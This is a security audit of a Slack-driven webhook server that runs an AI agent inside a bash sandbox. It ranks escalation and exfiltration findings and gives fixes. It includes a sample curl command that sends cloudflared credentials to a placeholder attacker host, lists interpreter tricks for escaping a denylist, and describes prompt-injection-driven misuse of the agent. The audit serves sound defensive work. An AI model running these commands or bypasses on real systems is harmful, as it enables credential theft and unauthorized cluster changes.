# Security audit — k3dm-webhook server

**Date:** 2026-09-07
**Scope:** `bin/k3dm-webhook` (3752 lines), `scripts/lib/webhook/{auth,render,proc,config,state}.py`, `bin/k3dm-ask-bash`
**Trigger:** user prioritized hardening the webhook-server ("double check … any possible for any hacker to hack it") before expanding it into a Slack-driven repair-approval control plane ([[project_hermes_slack_approval]]).
**Reviewer:** Claude (static review; no live exploitation performed).

---

## Attacker model / trust boundaries

The server binds **`127.0.0.1` only** (`bin/k3dm-webhook:3750`, `ThreadingHTTPServer`) — it is not
directly reachable from the network. Public reach is via the cloudflared tunnel to the laptop.
Two authenticated entry classes:

1. **`/api/v1/*`** — requires the admin bearer token (`_auth()` → `hmac.compare_digest`). Holder = admin.
2. **`/slack/events`** — requires a valid Slack request signature (`_verify_slack_signature`, HMAC-SHA256
   + 5-min replay window) **and** the Slack `user` to be in the role allowlist (`_slack_user_is_allowlisted`).

So an unauthenticated internet attacker can do nothing. The realistic threat actors are: (a) an
**allowlisted Slack user at `reader` tier** (lowest), (b) anyone who obtains the **Slack signing secret**
(forge any `user_id`, including an admin-mapped one), or (c) a compromised relay/tunnel. The findings
below are ranked against that model. The user's new controls (MFA on the Slack channel, 24h re-auth)
raise the bar for (a)/(b) but do **not** address the code-level escalations F1–F3.

---

## What is already strong (baseline — do not regress)

- Loopback-only bind; plaintext HTTP is acceptable because TLS terminates at the cloudflared edge and
  traffic never crosses the network in clear.
- **Timing-safe** bearer-token compare and Slack-signature compare (`hmac.compare_digest`), both fail-closed.
- Slack signature includes a **5-minute replay window** plus `event_id` dedup (`_seen_event_ids`, bounded).
- **Role model with audit**: per-endpoint `_action_policy` + per-thread-command `_thread_command_min_role`,
  enforced by `_role_allows` with a hard stop + `_audit_remote_action` on denial. Roles fail closed
  (`_request_role`: invalid → `reader`; unknown Slack user → `reader`).
- **Path-traversal guard** on job IDs (`_JOB_ID_RE` + `_safe_job_dir`).
- **Bounded request body** (`_content_length` + `MAX_BODY`, `413` on oversize) and **rate limiting** applied
  *after* auth/signature (the correct order).
- **Secret redaction** of job output (`_register_secret`/`_redact_secrets`, precompiled `re.sub` — avoids the
  earlier CodeQL clear-text-storage trap).
- Agent subprocesses are spawned via **argv lists, never a shell string** — the user question cannot inject
  host-level shell commands. A pre-filter (`_INJECTION_RE`) + control-char strip + a per-agent turn cap
  (`--max-turns`) + a 2-ask semaphore bound the `ask` surface.
- Token file is ignored if group/other-readable (`auth.py:_get_token`, mode 600 check).

---

## Findings (ranked)

### F1 — `/ask` fix-mode privilege escalation (HIGH)

**Where:** `bin/k3dm-webhook` — `_run_cluster_ask` (def line 2990), `K3DM_FIX_MODE` env (line 3207),
`_is_fix_request`/`_FIX_RE`, endpoint policy `"/api/v1/ask": {"min_role": "reader"}` (line 269) and thread
`"ask": "reader"` (line 283).

**Problem:** `_run_cluster_ask(job_id, agent, question, response_url, thread_ts, max_turns)` **is never passed
the caller's role.** Whether the agent runs in write-capable *fix mode* is decided entirely by the question
text: `fixing = _is_fix_request(question)` → `"K3DM_FIX_MODE": "1" if fixing else "0"`. `_FIX_RE` matches
`fix|heal|recover|repair|resolve|remediate|restart|resync|re-sync|force.?sync|bounce`. Because `ask` is
`min_role: reader`, **a reader-tier Slack user can unlock state-changing operations** (make `fix-*`,
`kubectl rollout restart`, `kubectl delete pod`, `argocd app sync`) simply by phrasing the question as
"restart the crashlooping pod" / "resync app X".

**Impact:** the reader/operator/admin gate on write actions is bypassed through the AI path. A reader can
cause cluster-state changes (pod deletion, rollout restarts, ArgoCD syncs).

**Fix:** thread the caller role into `_run_cluster_ask` (both the `/api/v1/ask` handler and
`_handle_thread_command` already know it — `request_role` / `slack_role`). Gate fix mode on role:
`K3DM_FIX_MODE = "1" if (fixing and _role_allows(role, "operator")) else "0"`, and reject or downgrade a
reader's fix request with an explicit "requires operator" notice (mirroring the existing thread-command
denial path). Add a regression test: reader + "restart pod" → `K3DM_FIX_MODE=0`.

### F2 — `ask` bash sandbox is a bypassable denylist with credential-dir read + GET egress (HIGH)

**Where:** `bin/k3dm-ask-bash` (144 lines), reachable by `reader` via `ask`.

**Problem:** the sandbox is a **denylist** of `grep -E` patterns in front of `exec /bin/bash "$@"`. Denylists
in front of a general shell are inherently leaky, and this one has concrete gaps:
- **Interpreters not blocked:** `awk` (`awk 'BEGIN{system("…")}'`), `sed` (GNU `e`), `find … -exec`, `ssh`/`scp`,
  editors (`vi`/`ex -c '!cmd'`, `less`/`man` `!`), `tar --to-command`. The denylist blocks python/perl/ruby/node
  and `sh -c`/`eval`/`env`/`xargs`, but not these.
- **`make` is unrestricted in read-only mode** — the `make fix-*`-only restriction is inside the `FIX_MODE==1`
  branch; in default read-only mode any `make <target>` runs arbitrary recipe shell.
- Patterns are **case-sensitive** and string-based (obfuscation-prone).
- **Broad read scope:** `_DIAG_PATHS` allows reading `/etc`, `~/.kube` (kubeconfig / embedded tokens),
  `~/.cloudflared` (tunnel credentials), `/Library/LaunchAgents`, `/var/log`. The per-arg scope check only
  inspects **absolute** args and never sees paths inside a `-c` string.
- **Egress:** only `curl`/`wget` *write* verbs (`-X POST/PUT/…`, `--data`, `--upload-file`) are blocked. A
  plain **`curl` GET is allowed**, so — even with **no bypass at all** — `curl "https://attacker/?d=$(cat ~/.cloudflared/*.json | base64)"`
  exfiltrates tunnel/kube credentials using only allowlisted verbs.

Note the enforcement boundary is **wider than the stated scope**: the agent system prompt says "do not access
files outside these repos", but the sandbox actually permits the credential dirs above. The prompt is soft
mitigation; the sandbox is the hard boundary, and it leaks.

**Impact:** a reader-tier user (or an agent steered by prompt injection in a log/doc it reads) can read local
credential material and exfiltrate it over an allowed GET, and likely reach arbitrary local command execution
via an un-blocked interpreter or `make`.

**Fix (in priority order):** (1) drop `~/.kube`, `~/.cloudflared`, `/etc`, `/Library/LaunchAgents` from
`_DIAG_PATHS` — or gate them behind an explicit, role-checked read-list; (2) **convert to an allowlist** — permit
only a vetted set of read-only subcommands (`kubectl get/describe/logs/top/events`, `git log/diff/show/status`,
`jq`, `grep`/`sed`/`awk` on stdin only, etc.) and reject everything else, rather than chasing a denylist; (3)
block outbound network from the sandbox except the Slack API host (or drop `curl`/`wget` entirely — the agent
does not need general egress to troubleshoot); (4) longer-term, run the agent as a lower-privilege user or in a
container so the OS enforces the boundary instead of a bash wrapper.

### F3 — `response_url` / `_slack_post` has no host allowlist → blind SSRF + output exfil (MEDIUM)

**Where:** `scripts/lib/webhook/render.py:_slack_post` (line 17); callers pass `body.get("response_url")`
(e.g. `bin/k3dm-webhook:3004, 2328, 2556, 2643, 2739`).

**Problem:** `_slack_post(url, text)` POSTs the job output to **whatever `url` it is given**, with no scheme/host
validation. Slack's real `response_url` is always `https://hooks.slack.com/…`, but the server trusts the value
relayed in the request body. An admin-token request (or a forged/compromised relay request) can set
`response_url` to any host → (a) **output exfiltration** to an attacker server (redaction is best-effort, not a
guarantee), and (b) a **blind SSRF POST** primitive against loopback services the laptop can reach (Vault
`:18200`, ArgoCD `:8080`, Prometheus, k8s `:6443`) — the response is discarded, so blind-only, but still a gap.

**Impact:** medium — gated behind admin auth on the API path, but it is exactly the trust seam that widens when
slash-command `response_url`s start flowing through the relay for the Slack-approval feature.

**Fix:** validate in `_slack_post` (and/or at request intake): reject unless `scheme == "https"` and
`netloc in {"hooks.slack.com", "slack.com"}`. Drop with a logged warning otherwise. Cheap, central, and it also
neutralizes the SSRF primitive.

### F4 — `X-K3DM-Role` is client-asserted (LOW / INVARIANT TO DOCUMENT)

**Where:** `bin/k3dm-webhook:_request_role` (line 308).

**Problem:** for direct-token (`/api/v1/*`) requests the effective role is taken from the `X-K3DM-Role` header
(absent → admin). This is **safe today only because there is a single admin token** — a header-declared role
cannot exceed what the one token already grants. But if role-scoped tokens are ever introduced (a plausible
step toward least privilege), a low-tier token could send `X-K3DM-Role: admin` and escalate.

**Fix:** document the invariant now ("role is header-asserted; there must be exactly one admin-equivalent
token"). If/when multiple tokens are introduced, bind the role to the **token identity** server-side, not to the
header.

### F5 — regex pre-filters (`_INJECTION_RE`, sandbox patterns) are bypass-prone (LOW, supports F2)

Treat prompt injection as inevitable: `_INJECTION_RE` blocks a handful of English jailbreak phrases but not
paraphrases/encodings, and the sandbox denylist is similarly evadable. These are fine as **defense-in-depth**
but must not be the primary boundary — F2's allowlist + egress control is the real fix.

### F6 — rate limiter is a single global bucket (LOW)

**Where:** `_rate_limited` (line 230) — one counter per bucket name (`"api"`/`"slack"`), not per actor. One noisy
caller can trip the `429` for everyone (availability DoS). Acceptable for a personal deployment; if the Slack
surface grows, key the bucket per Slack user / per token.

---

## Recommended remediation order (feeds the Slack-approval milestone)

1. **F1** — smallest, highest-value: pass role into `_run_cluster_ask`, gate fix mode on `operator+`. (bugfix)
2. **F3** — central `response_url` host allowlist in `_slack_post`. (bugfix, also unblocks safe relay of slash-command response_urls)
3. **F2** — the real project: tighten `_DIAG_PATHS`, remove sandbox egress, move toward an allowlist / container. (its own `docs/plans/` spec)
4. **F4** — document the single-admin-token invariant; revisit if role-scoped tokens are added.

F1 and F3 are self-contained bugfixes suitable for a `docs/bugs/` spec now; F2 warrants its own plan doc and
should land **before** `ask`/repairs are exposed to a wider Slack audience.

## Process note

The recurring pattern here is **denylist-in-front-of-a-general-capability** (bash sandbox, injection regex,
`curl` verb filter). For any surface an untrusted-tier user can reach, prefer an **allowlist of vetted
operations** and let the OS/network enforce the boundary. Add this to the webhook/repair spec template.
